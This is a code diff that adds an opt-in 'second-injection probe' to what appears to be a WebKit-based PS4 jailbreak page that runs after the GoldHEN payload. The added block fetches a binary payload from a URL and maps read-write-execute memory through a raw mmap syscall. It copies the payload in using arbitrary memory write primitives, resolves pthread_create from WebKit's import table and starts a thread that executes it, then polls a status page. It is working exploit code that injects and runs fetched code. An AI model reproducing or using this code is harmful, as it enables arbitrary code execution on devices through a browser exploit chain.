@@ -2314,6 +2314,98 @@ let allDone = false;
                         }
                     }
 
+                    // ================== POST-GOLDHEN SECOND-INJECTION PROBE ==================
+                    // ?postprobe=1 : after the GoldHEN payload thread is up, attempt a SECOND
+                    // raw injection (mmap + write + pthread_create) and poll the status page it
+                    // writes at [base + 0x1000]. Answers the one open question: are window.p /
+                    // callAddr / pthread_create still alive AFTER GoldHEN took over the kernel?
+                    // Opt-in so the normal jailbreak path is untouched.
+                    if (payloadRunning && params.get("postprobe") === "1"
+                        && off.wk___imp_pthread_create !== undefined) {
+                        state("post-probe...", "warn");
+                        try {
+                            const probeUrl = params.get("probeurl") || "ludora-post-goldhen-probe.bin";
+                            const pr = await fetch(probeUrl);
+                            if (!pr.ok) {
+                                mark("POSTPROBE-FETCH", "http=" + pr.status);
+                            } else {
+                                const probe = new Uint8Array(await pr.arrayBuffer());
+                                if (probe.length >= 4 && probe[0] === 0x7f && probe[1] === 0x45
+                                    && probe[2] === 0x4c && probe[3] === 0x46) {
+                                    mark("POSTPROBE-PAYLOAD", "ELF-rejected");
+                                } else {
+                                    const psz = (probe.length + 0x3fff) & ~0x3fff;
+                                    const pm = sc(SYS.mmap, 0, psz, 7, 0x1002, -1, 0);
+                                    const pentry = new int64(pm.lo, pm.hi);
+                                    if (pentry.hi > 0) {
+                                        mark("POSTPROBE-MAP", "size=0x" + psz.toString(16) + " rwx=" + pentry);
+                                        for (let i = 0; i < probe.length; ++i)
+                                            p.write1(pentry.add32(i), probe[i]);
+                                        let pbad = -1;
+                                        for (let i = 0; i < probe.length; ++i)
+                                            if (p.read1(pentry.add32(i)) !== probe[i]) { pbad = i; break; }
+                                        check("postprobe-rwx-memory", pbad < 0,
+                                            pbad < 0 ? "" : "mismatch at +" + hx(pbad));
+                                        if (pbad < 0) {
+                                            const slot = webkitBase.add32(off.wk___imp_pthread_create);
+                                            const fn = p.read8(slot);
+                                            const expect = libkernelBase.add32(off.k_pthread_create);
+                                            const agree = same(fn, expect);
+                                            mark("POSTPROBE-PTHREAD-TABLE", "agree=" + (agree ? 1 : 0));
+                                            if (agree) {
+                                                const thr = new ArrayBuffer(8);
+                                                keepAlive.push(thr);
+                                                const thrAddr = bufAddr(thr);
+                                                new Uint8Array(thr).fill(0);
+                                                // Pass the mapped base as the pthread arg so the payload's
+                                                // crt0 (RDI = base) writes its status page at base+0x1000.
+                                                const rc = callAddr(expect,
+                                                    [thrAddr, 0, pentry, pentry]).i32;
+                                                const handle = new int64(
+                                                    new DataView(thr).getUint32(0, true),
+                                                    new DataView(thr).getUint32(4, true));
+                                                const ok = rc === 0 && handle.hi > 0;
+                                                mark("POSTPROBE-CREATE", "rc=" + rc
+                                                    + " handle=" + handle + " entry=" + pentry);
+                                                check("postprobe-thread-created", ok, "");
+                                                const STATUS_OFF = 0x1000;
+                                                const POSTPROBE_MAGIC = 0x4c445047;
+                                                const deadline = Date.now() + 5000;
+                                                let seq = -1, lastStage = 0;
+                                                await new Promise((resolve) => {
+                                                    const tick = () => {
+                                                        const magic = p.read4(pentry.add32(STATUS_OFF)) >>> 0;
+                                                        const stage = p.read4(pentry.add32(STATUS_OFF + 8)) >>> 0;
+                                                        const result = p.read4(pentry.add32(STATUS_OFF + 0xc)) | 0;
+                                                        const sequence = p.read4(pentry.add32(STATUS_OFF + 0x18)) >>> 0;
+                                                        if (sequence !== seq) {
+                                                            seq = sequence; lastStage = stage;
+                                                            mark("POSTPROBE-POLL", "magic=" + hx(magic)
+                                                                + " stage=" + stage + " result=" + result
+                                                                + " seq=" + sequence);
+                                                        }
+                                                        if (magic === POSTPROBE_MAGIC
+                                                            && (stage === 0x7f || stage === 0x80)) { resolve(); }
+                                                        else if (Date.now() >= deadline) {
+                                                            mark("POSTPROBE-TIMEOUT",
+                                                                "magic=" + hx(magic) + " stage=" + lastStage);
+                                                            resolve();
+                                                        } else { setTimeout(tick, 100); }
+                                                    };
+                                                    tick();
+                                                });
+                                            }
+                                        }
+                                    } else {
+                                        mark("POSTPROBE-MAP", "mmap-failed lo=" + pm.lo);
+                                    }
+                                }
+                            }
+                        } catch (e) {
+                            mark("POSTPROBE-THREW", (e && e.message) ? e.message : String(e));
+                        }
+                    }
+
                     // ================== END-OF-RUN STATE DUMP ==================
                     // READ ONLY. Not a fix -- a measurement. Everything above has
                     // finished, so this reports what we ACTUALLY leave behind
